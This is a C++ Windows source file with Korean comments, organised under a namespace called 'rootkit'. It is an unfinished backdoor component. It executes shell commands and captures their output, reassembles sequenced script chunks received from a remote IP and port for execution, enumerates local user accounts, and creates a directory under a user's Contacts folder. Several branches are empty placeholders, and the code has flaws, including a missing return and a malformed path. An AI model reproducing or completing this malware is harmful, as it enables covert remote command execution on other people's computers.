#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#define NODRAWTEXT      // DrawText()와 DT_* 매크로 제외
#define NOGDI           // GDI 기능을 제외 (폰트, 비트맵 등 안 쓸 때)
#define NOKANJI         // 한자 지원 제외
#include <windows.h>
#include <lm.h>

#pragma comment(lib, "netapi32.lib")

#include <iostream>
#include <cstdio>  
#include <string>
#include <memory>
#include <array>
#include <vector>
#include <variant>
#include <unordered_map>
#include <filesystem>
#include <algorithm>

namespace fs = std::filesystem;

// 큐 구조체
struct Queue {
	bool listening = false;
	int lastOrderNum = 0;
	// composite key start
	std::string ip; 
	unsigned short port = 0; 
	// composite key end
	bool directoryCreated = false;
};

// 코드 구조체
struct Code {
	int line;
	std::string code;
};

bool is_numeric(const std::string& s) {
	try {
		int _dummy = std::stoi(s);
		return true;
	}
	catch (const std::exception&) {
		return false;
	}
}

namespace rootkit {
	// Forward Declaration
	std::vector<std::string> get_username_list();


	std::vector<Queue> queueLists;
	std::unordered_map<std::string, std::vector<Code>> codes;

	std::string run_cmd_with_output(const std::string& cmd) {
		std::array<char, 128> buffer;
		std::string result;

		std::string redirect_cmd = cmd + " 2>&1";

		FILE* pipe = _popen(redirect_cmd.c_str(), "r");

		if (!pipe) {
			return "Error: Failed to open pipe";
		}

		try {
			while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe) != nullptr) {
				result += buffer.data();
			}
		}
		catch (...) {
			_pclose(pipe);
			throw;
		}

		_pclose(pipe);
		return result;
	}

	std::string to_cmd_script(const std::string& cmd) {
		std::string postfix = "";
		bool isFirstSpaceCounted = false;
		for (int i = 0; i < cmd.length(); i++) {
			if (cmd[i] == ' ' && !isFirstSpaceCounted) {
				isFirstSpaceCounted = true;
				continue;
			}
			
			if (isFirstSpaceCounted) postfix += cmd[i];
		}
		return postfix;
	}

	
	// first = 변환된 문자열(명령어 부분만 추출한), second = 성공/실패 여부
	// second가 false일시 first는 항상 ""이 됨
	// second가 nullptr일시 앞에 패키지가 손실됨을 의미함
	// second가 nullptr이어도 first는 항상 ""이 됨
	std::pair<std::string, std::variant<bool, nullptr_t>> exploit_bat_formatter(std::string& ip, unsigned short port, const std::string& str) {
		// 앞 4자리는 순서 번호
		// 바로 다음 한자리 숫자는 종료 플래그(0 = 계속 전송중, 1 = 종료 플래그)
		// 뒤는 데이터

		// ip랑 포트번호를 어떻게 구함?
		// 내가 직접 넘겨줘야하나...


		std::string headerAll = str.substr(0, 5);
		if (!is_numeric(headerAll)) {
			return { "", false };
		}
		std::string headerOrderNumber = headerAll.substr(0, 4);
		std::string headerFlag = headerAll.substr(4);
		int headerOrderNumber_i = std::stoi(headerOrderNumber);
		int headerFlag_i = std::stoi(headerFlag);
		if (headerFlag_i != 1 && headerFlag_i != 0) {
			return { "", false };
		}
		// 코드(데이터) 파싱
		std::string code = str.substr(5);

		std::vector<std::string> userList = rootkit::get_username_list();
		std::sort(userList.begin(), userList.end());
		std::string dir = "C:/Users/" + userList[0] + "Contacts/port";

		// 이미 Queue에 등록되어 있는 경우
		if (codes.count(ip)) {
			bool headerFlag_b = (headerFlag_i == 1) ? true : false;
			// 송신 종료 플래그 == true
			if (headerFlag_b == true) {
				// 작성 필요
			}
			// 송신 종료 플래그 == false
			else {
				// 작성 필요
			}
		}
		// 처음 연결, 혹은 Queue에 등록되어 있지 않은 경우
		else {
			bool headerFlag_b = (headerFlag_i == 1) ? true : false;
			if (headerFlag_b == true) {
				// 처음 메세지가 전송 끝이면 거절 장난하자는거야 뭐야;;
				// 한줄만 쓸꺼면 exploit을 쓰세요 제발;;
				return { "", false };
			}
			Queue queue;
			queue.listening = true;
			queue.lastOrderNum = headerOrderNumber_i;
			queue.ip = ip;
			queue.port = port;
			queueLists.push_back(queue);
			codes.try_emplace(ip);	
			codes[ip].emplace_back(headerOrderNumber_i, code);
			// 설마 여기까지 왔는데 true겠어
			// 하지만 믿으면 안되지 검증은 필수
			if (queue.directoryCreated == false) {
				fs::create_directories(dir);
				queue.directoryCreated = true;
			}
		}
	}

	std::vector<std::string> get_username_list() {
		LPUSER_INFO_1 pBuf = NULL;
		DWORD entriesRead = 0, totalEntries = 0, resumeHandle = 0;

		NET_API_STATUS nStatus = NetUserEnum(NULL, 1, FILTER_NORMAL_ACCOUNT, reinterpret_cast<LPBYTE*>(&pBuf), MAX_PREFERRED_LENGTH, &entriesRead, &totalEntries, &resumeHandle);

		std::vector<std::string> user_list;

		if (nStatus == NERR_Success || nStatus == ERROR_MORE_DATA) {
			for (DWORD i = 0; i < entriesRead; i++) {

				if (pBuf[i].usri1_flags & UF_ACCOUNTDISABLE) continue;

				int size_needed = WideCharToMultiByte(CP_ACP, 0, pBuf[i].usri1_name, -1, NULL, 0, NULL, NULL);
				std::string strTo(size_needed - 1, 0);
				WideCharToMultiByte(CP_ACP, 0, pBuf[i].usri1_name, -1, &strTo[0], size_needed, NULL, NULL);
				user_list.push_back(strTo);
			}
		}

		if (pBuf != NULL) {
			NetApiBufferFree(pBuf);
		}

		return user_list;
	}
}